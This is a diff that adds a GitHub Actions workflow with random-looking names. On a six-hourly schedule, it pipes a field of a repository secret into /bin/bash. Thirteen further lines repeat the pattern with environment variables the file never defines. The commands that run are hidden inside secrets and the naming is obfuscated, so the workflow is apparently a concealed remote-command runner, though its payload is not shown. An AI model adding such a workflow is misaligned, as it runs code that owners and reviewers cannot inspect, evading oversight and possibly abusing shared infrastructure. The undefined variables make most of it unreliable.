@@ -1,0 +1,30 @@
+name: hanweijinghuweishe
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hanweijinghuweishe
+        env:
+          qovdf78217: ${{ secrets.qovdf78217 }}
+        run: |
+          echo $qovdf78217 | jq -r .gdn875 | /bin/bash
+          echo $oo617 | jq -r .njr956 | /bin/bash
+          echo $wm97785 | jq -r .fe3 | /bin/bash
+          echo $ojz106 | jq -r .t6 | /bin/bash
+          echo $zp919 | jq -r .uprzt55341 | /bin/bash
+          echo $kjyem6811 | jq -r .gfvdu5663 | /bin/bash
+          echo $eo94 | jq -r .rg68 | /bin/bash
+          echo $j86 | jq -r .ap5 | /bin/bash
+          echo $mob40 | jq -r .uzqrm85668 | /bin/bash
+          echo $rz85 | jq -r .tpvff38704 | /bin/bash
+          echo $enho41 | jq -r .spok5 | /bin/bash
+          echo $olgfg353 | jq -r .iycav5263 | /bin/bash
+          echo $k245 | jq -r .hf02 | /bin/bash
+          echo $oxzf7950 | jq -r .qkl1423 | /bin/bash
+
